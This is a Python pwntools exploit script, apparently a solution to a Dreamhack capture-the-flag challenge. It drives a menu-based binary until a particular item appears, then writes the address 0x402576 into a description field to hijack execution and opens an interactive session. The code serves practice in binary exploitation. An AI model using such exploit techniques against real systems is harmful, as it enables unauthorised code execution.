#!/usr/bin/env python3

from pwn import *

exe = ELF("./main")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 11638)

    return r


def main():
    r = conn()

    idx = -1
    while True:
        r.sendlineafter(b">> ", b"1")
        r.recvline()
        result = r.recvline().decode()
        if "undiscovered" in result:
            r.sendlineafter(b"description : ", b"DUMMY")
            idx += 1
        elif "rare-earth" in result:
            idx += 1
            break
        elif "nothing" in result:
            pass
    
    r.sendlineafter(b">> ", b"3")
    r.sendlineafter(b"Index : ", str(idx).encode())
    r.sendlineafter(b"description : ", p64(0x402576))

    r.sendlineafter(b">> ", b"2")
    r.interactive()


if __name__ == "__main__":
    main()